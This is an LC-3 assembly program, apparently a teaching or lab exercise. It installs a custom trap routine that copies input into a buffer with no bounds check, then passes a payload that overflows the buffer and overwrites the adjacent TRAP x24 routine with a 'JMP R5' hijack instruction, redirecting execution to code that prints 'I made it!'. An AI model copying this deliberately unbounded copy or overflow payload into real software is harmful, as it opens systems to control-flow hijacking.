.ORIG x3000

    LD R5, GOAL_ADDR   

    LEA R0, PAYLOAD    
    
    TRAP x30           

    TRAP x24        ;LC3tools里面 x0024:x0340   

    HALT

GOAL_ADDR   .FILL x4000

PAYLOAD     .FILL x032C            ; 写入 x032C (填充区第1个字)
            .FILL x032D            ; 写入 x032D
            .FILL x032E            ; 写入 x032E
            .FILL x032F            ; 写入 x032F
            .FILL x0330            ; 写入 x0330
            .FILL x0331            ; 写入 x0331
            .FILL x0332            ; 写入 x0332
            .FILL x0333            ; 写入 x0333
            .FILL x0334            ; 写入 x0334
            .FILL x0335            ; 写入 x0335
            .FILL x0336            ; 写入 x0336
            .FILL x0337            ; 写入 x0337
            .FILL x0338            ; 写入 x0338
            .FILL x0339            ; 写入 x0339
            .FILL x033A            ; 写入 x033A
            .FILL x033B            ; 写入 x033B
            .FILL x033C            ; 写入 x033C
            .FILL x033D            ; 写入 x033D
            .FILL x033E            ; 写入 x033E
            .FILL x033F            ; 写入 x033F (缓冲区结束) 

            .FILL xC140            ; JMP R5 (劫持指令)

            .FILL x0000            

.END

.ORIG x30
.FILL x930
.END

.ORIG x930
ST R0, SAVED_R0
ST R1, SAVED_R1
ST R2, SAVED_R2
LD R1, PROMPT_ADDR
LOOP
LDR R2, R0, x0
STR R2, R1, x0
BRz LEAVE
ADD R0, R0, x1
ADD R1, R1, x1
BR LOOP
LD R0, SAVED_R0
LD R1, SAVED_R1
LD R2, SAVED_R2
LEAVE RTI
PROMPT_ADDR .FILL x032c
SAVED_R0 .BLKW 1
SAVED_R1 .BLKW 1
SAVED_R2 .BLKW 1
.END


.ORIG x4000
LDI R0, ADDR
LEA R0, WOW
PUTS
HALT
ADDR .FILL x1
WOW .STRINGZ "I made it!"
.END